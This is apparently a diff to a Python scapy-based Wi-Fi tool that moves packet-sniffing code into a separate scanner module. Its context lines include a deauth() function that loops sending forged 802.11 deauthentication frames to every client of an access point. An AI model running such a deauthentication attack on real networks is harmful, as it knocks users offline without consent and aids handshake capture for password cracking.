@@ -7,11 +7,12 @@ import scapy.packet
 from change_channel import change_channel
 import gui
 
+import scanner
+
 # TODO:
 # Support other types of frames to identify clients
 # Show number of packets sent
 # Show security standard
-# Capture handshakes
 
 INTERFACE_NAME = 'wlan0mon'
 START_CHANNEL = 1
@@ -161,17 +162,9 @@ def process_client_data_frame(src, dest):
                 bssid_map[dest].add_client(src)
 
 
-def start_sniffing():
-    sniff(iface=INTERFACE_NAME, prn=handle_packet, store=False, stop_filter=lambda x: stop_sniffing.is_set())
-
-
-def create_sniff_thread():
-    return threading.Thread(target=start_sniffing)
-
-
 def deauth(ap, stop):
     """Craft and send deauthentication packets"""
-    
+
     while not stop.is_set():
         for client in ap.clients:
             ap_to_client = RadioTap()/Dot11(type=0, subtype=12, addr1=ap.bssid, addr2=client, addr3=ap.bssid)/Dot11Deauth()
@@ -198,7 +191,7 @@ stop_changing_channel = threading.Event()
 stop_deauthing = threading.Event()
 
 print('Starting sniffing thread')
-sniff_thread = create_sniff_thread()
+sniff_thread = scanner.create_sniff_thread()
 sniff_thread.start()
 
 print('Starting GUI thread')
